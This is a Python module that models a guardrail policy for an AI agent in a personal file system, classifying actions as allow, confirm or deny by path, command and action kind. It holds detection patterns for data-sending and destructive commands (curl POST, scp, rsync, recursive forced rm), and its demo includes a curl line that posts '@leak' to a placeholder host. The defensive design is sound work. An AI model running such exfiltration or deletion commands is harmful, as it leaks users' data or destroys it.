"""
guardrail.py — a deterministic MODEL of the §5 guardrail, implemented exactly as the
design specifies it.

Why this exists: the Personal OS has no implementation yet — only a spec. The cheapest way
to test a spec is to *encode its rules as code* and fire adversarial inputs at it. Where the
code has to guess, the spec is ambiguous; where an input slips through, the spec has a hole.
This module is the single source of truth for "would the dispatcher allow this?", and it is
reused by BOTH the deterministic case suite and the LLM-operator simulation.

Reliability hardening (v3.7, found by the test/ adversarial suite):
  - paths are matched CASE-INSENSITIVELY (macOS HFS+/APFS are case-insensitive, so IN/ ≡ in/),
  - a write is checked against its resolved `realpath` too (symlink-escape defense),
  - external transmit is confirm-class for ANY tool (deploy/publish/upload/exfil), not just git.

Phase 2 Task 1c moved one rule rather than hardening it: `~/files/**/in/` is APPEND-ONLY, not
read-only. See `_write_verdict`.

Decision classes (§5): read | safe_write | draft_only | confirm | deny.
No third-party deps. Python 3.10+.
"""
from __future__ import annotations
import os
import re
from dataclasses import dataclass

HOME = os.environ.get("PLAINKEEP_TEST_HOME", "/Users/tamas")

# The wall's vault segment is the SELECTED data root (ADR-014 D5, Phase 2 Task 1b), not a directory
# whose NAME is part of the safety model. It used to be the constant `f"{HOME}/plainkeep"`, which is
# what made "a vault at any other path has every guarded write denied" true, and what made "selecting
# vault A still authorizes writes into vault B" true after ADR-015 added the active root beside it.
#
# There is deliberately no fallback in the engine (`bin/lib/guardrail.py` refuses when
# PLAINKEEP_HOME is unset). The default kept here is the CONVENTIONAL location and exists only so
# `python3 test/lib/guardrail.py` still demos: both harnesses that fire the validated cases at this
# model set PLAINKEEP_HOME explicitly, to exactly this value, so all 59 keep their recorded verdict
# for the recorded reason.
PLAINKEEP = os.environ.get("PLAINKEEP_HOME") or f"{HOME}/plainkeep"
WORK = f"{HOME}/work"
FILES = f"{HOME}/files"
DOTFILES = f"{HOME}/dotfiles"

# Paths walled off by LOCATION (§2, §5) — matched case-insensitively.
WALLED_OFF_MARKERS = [
    f"{HOME}/Library/Mobile Documents",
    f"{HOME}/iCloud Drive",
    "Mobile Documents",
    "iCloud",
    f"{HOME}/Pictures/Photos Library.photoslibrary",
    f"{HOME}/Pictures",
]

ALLOW, CONFIRM, DENY = "allow", "confirm", "deny"
_ORDER = {ALLOW: 0, CONFIRM: 1, DENY: 2}

KNOWN_VERBS = {
    "help", "status", "doctor", "backup", "index", "consolidate",
    "capture", "triage", "start", "close", "week",
    "search", "wiki", "task", "new", "repo", "archive", "files", "sweep",
    "invoice", "job", "organize", "share",
}

# External commands that transmit / publish / spend outside the machine — confirm-class for
# ANY tool, not just git (§5). force/destructive variants escalate to deny.
TRANSMIT_PATTERNS = [
    (r"\bgit\s+push\b", "git push"),
    (r"\b(npm|pnpm|yarn|bun)\s+publish\b", "package publish"),
    (r"\b(vercel|netlify|flyctl|fly|wrangler|gcloud|heroku|render|railway)\b.*\bdeploy", "deploy"),
    (r"\b(vercel|netlify)\b.*--prod", "prod deploy"),
    (r"\baws\s+s3\b", "aws s3"),
    (r"\bgsutil\b", "gsutil"),
    (r"\bscp\b", "scp"),
    (r"\brsync\b.*(::|\S+@\S+:)", "rsync remote"),
    (r"\bgh\s+(pr\s+merge|release\s+create|api\b.*-X\s*(POST|PUT|PATCH|DELETE))", "gh write"),
    (r"\bcurl\b.*(-X\s*(POST|PUT|PATCH|DELETE)|--data\b|--data-\w+|-d\b|--upload-file\b|-T\b)", "curl write"),
    (r"\bwget\b.*--post", "wget post"),
]
# rm that is both recursive AND forced, flags in any order / long form.
DANGER_RM = [
    r"\brm\s+-[a-z]*r[a-z]*f", r"\brm\s+-[a-z]*f[a-z]*r",
    r"\brm\s+-r\b.*\s-f\b", r"\brm\s+-f\b.*\s-r\b",
    r"\brm\s+--recursive\b.*--force\b", r"\brm\s+--force\b.*--recursive\b",
]


@dataclass
class Decision:
    verdict: str
    reason: str
    risk_class: str

    def __str__(self) -> str:
        return f"{self.verdict.upper()} [{self.risk_class}] — {self.reason}"


def _norm(path: str | None) -> str | None:
    if not path:
        return None
    p = path.strip()
    if p.startswith("~"):
        p = HOME + p[1:]
    return os.path.normpath(p)


def _under(path: str, root: str) -> bool:
    pl, rl = path.lower(), root.lower()   # macOS case-insensitive FS
    return pl == rl or pl.startswith(rl + "/")


def _is_walled_off(path: str) -> bool:
    pl = path.lower()
    return any(m.lower() in pl for m in WALLED_OFF_MARKERS)


def _in_originals(path: str) -> bool:
    return _under(path, FILES) and re.search(r"/in(/|$)", path, re.IGNORECASE) is not None


def _write_verdict(path: str, action: dict) -> Decision:
    """The §5 path-wall decision for a single concrete target path."""
    if _is_walled_off(path):
        return Decision(DENY, "iCloud/family path is walled off — propose, never write", "deny")
    if _in_originals(path):
        # APPEND-ONLY, not read-only (Phase 2 Task 1c). Evidence has to ARRIVE — `files ingest
        # --client` exists to put an original under in/ — so a rule that denied every write there
        # did not protect originals, it exempted the verb that creates them from the wall. An atomic
        # CREATE is allowed; overwrite, replace, mutate and delete never are.
        #
        # The model does NOT stat the path, and that is the point rather than an omission: "deny an
        # existing path, allow a new one" is a TOCTOU window, since another arrival can take the name
        # between the question and the write. `create_only` is a claim about a syscall that fails
        # EEXIST (`link(2)`, `O_CREAT|O_EXCL`, `mkdir(2)`); the guarantee lives in bin/lib/vaultio.py,
        # which is the only thing allowed to assert it.
        if action.get("create_only"):
            return Decision(ALLOW, "~/files/**/in/ is append-only: an original ARRIVES by atomic creation",
                            "safe_write")
        return Decision(DENY, "~/files/**/in/ originals are append-only evidence — an existing one is "
                              "never overwritten, and only an atomic create may add one", "deny")
    if _under(path, PLAINKEEP):
        return Decision(ALLOW, "write inside the selected vault is a revertible git diff", "safe_write")
    if _under(path, FILES):
        return Decision(ALLOW, "write inside ~/files (out/work/research)", "safe_write")
    if _under(path, f"{WORK}/.worktrees"):
        return Decision(ALLOW, "write inside ~/work/.worktrees (sanctioned agent worktree, §8.4)", "safe_write")
    if _under(path, WORK):
        task_repo = _norm(action.get("task_repo"))
        repo = _norm(action.get("repo")) or path
        if task_repo and (repo == task_repo or _under(path, task_repo)):
            return Decision(ALLOW, "write inside the task's ~/work repo", "safe_write")
        return Decision(DENY, "write to a ~/work repo that is not the current task's repo", "deny")
    if _under(path, DOTFILES):
        return Decision(CONFIRM, "~/dotfiles: inspect, don't change without being asked", "confirm")
    return Decision(DENY, f"path escapes the three roots: {path}", "deny")


def classify(action: dict) -> Decision:
    """
    action keys (all optional except kind):
      kind: read | write | transmit | delete | read_secret | resolve_secret | draft | propose | ask | verb
      path, realpath, command, flags{yes,force}, repo, task_repo
      create_only: the write is an ATOMIC CREATE — a syscall that fails EEXIST rather than replacing
        (`link(2)`, `O_CREAT|O_EXCL`, `mkdir(2)`). Only `bin/lib/vaultio.py`'s primitives may say it;
        it is what distinguishes an original ARRIVING under ~/files/**/in/ from one being overwritten.
    """
    kind = action.get("kind", "verb")
    flags = action.get("flags", {}) or {}
    yes = bool(flags.get("yes"))
    force = bool(flags.get("force"))
    path = _norm(action.get("path"))
    realpath = _norm(action.get("realpath"))
    command = (action.get("command") or "").strip()

    # --- 0. Command sniffing: catastrophic / transmitting commands regardless of stated kind ---
    if command:
        if any(re.search(p, command) for p in DANGER_RM):
            return Decision(DENY, f"recursive forced delete is denied: '{command}'", "deny")
        if re.search(r"git\s+push\b.*(--force\b|--force-with-lease\b|\s-f\b)", command):
            return Decision(DENY, f"force push is denied: '{command}'", "deny")
        for pat, label in TRANSMIT_PATTERNS:
            if re.search(pat, command, re.IGNORECASE):
                if force:
                    return Decision(DENY, f"forced external transmit ({label}) is denied: '{command}'", "deny")
                if yes:
                    return Decision(ALLOW, f"external transmit ({label}) authorized by --yes", "confirm")
                return Decision(CONFIRM, f"external transmit ({label}) needs explicit --yes: '{command}'", "confirm")

    # --- 1. Secrets ---
    if kind == "read_secret" or (path and re.search(r"(^|/)\.env($|\.|/)", path)):
        return Decision(DENY, "reading .env / secret values is denied", "deny")
    if kind == "resolve_secret":
        return Decision(DENY, "resolving an op:// secret to its value is denied (naming the ref is fine)", "deny")

    # --- 2. read-class ---
    if kind == "read":
        for p in (path, realpath):
            if p and _is_walled_off(p):
                return Decision(DENY, "reading the iCloud/family tree is off every command path", "deny")
        return Decision(ALLOW, "read-only", "read")

    # --- 3. transmit / external side effects ---
    if kind == "transmit":
        if force:
            return Decision(DENY, "forced external transmit is denied", "deny")
        if yes:
            return Decision(ALLOW, "external transmit authorized by explicit --yes", "confirm")
        return Decision(CONFIRM, "external transmit (email/post/deploy/payment) needs explicit --yes", "confirm")

    # --- 4. delete ---
    if kind == "delete":
        for p in (path, realpath):   # append-only cuts both ways: an original is never removed either
            if p and _in_originals(p):
                return Decision(DENY, "~/files/**/in/ is append-only: an original is never deleted", "deny")
        if force:
            return Decision(DENY, "forced delete is denied", "deny")
        return Decision(CONFIRM, "delete is irreversible — needs explicit --yes", "confirm")

    # --- 5. draft_only ---
    if kind == "draft":
        return Decision(ALLOW, "draft produced; a human transmits", "draft_only")

    # --- 6. propose / ask have no side effect ---
    if kind in ("propose", "ask"):
        return Decision(ALLOW, f"{kind} has no side effect", "read")

    # --- 7. writes: path wall, evaluated against the literal path AND its resolved realpath ---
    if kind == "write":
        if not path:
            return Decision(DENY, "write with no resolvable path", "deny")
        primary = _write_verdict(path, action)
        if realpath and realpath != path:
            secondary = _write_verdict(realpath, action)
            if _ORDER[secondary.verdict] > _ORDER[primary.verdict]:
                return Decision(secondary.verdict,
                                f"symlink resolves to {realpath}: {secondary.reason}", secondary.risk_class)
        return primary

    # --- 8. verb / command ---
    # The "never invent a verb" rule is about the PLAINKEEP surface only. Raw shell tools (git,
    # script/*, rg, $EDITOR) are allowed per §13 — transmit/rm were already sniffed above, and
    # any path write they do is policed via the 'write' kind + the adapter tool-scoping (§12.5).
    if kind == "verb":
        v = (action.get("verb") or "").strip()
        if v.startswith("plainkeep "):
            verb = v[len("plainkeep "):].split()[0] if len(v) > len("plainkeep ") else ""
            if verb and verb not in KNOWN_VERBS:
                return Decision(DENY, f"unknown/invented plainkeep verb: '{verb}' (not in plainkeep.json)", "deny")
            return Decision(ALLOW, "known plainkeep verb, no path side effect declared", "read")
        return Decision(ALLOW, "raw shell command (path wall + adapter tool-scoping govern it, §13/§12.5)", "read")

    return Decision(DENY, f"unrecognized action kind: {kind}", "deny")


if __name__ == "__main__":
    samples = [
        {"kind": "write", "path": "~/plainkeep/synced/x", "realpath": "~/Library/Mobile Documents/x"},
        {"kind": "write", "path": "~/files/clients/a/IN/brief.pdf"},
        {"kind": "verb", "command": "vercel deploy --prod"},
        {"kind": "verb", "command": "curl -X POST https://x -d @leak"},
    ]
    for s in samples:
        print(f"{s} -> {classify(s)}")
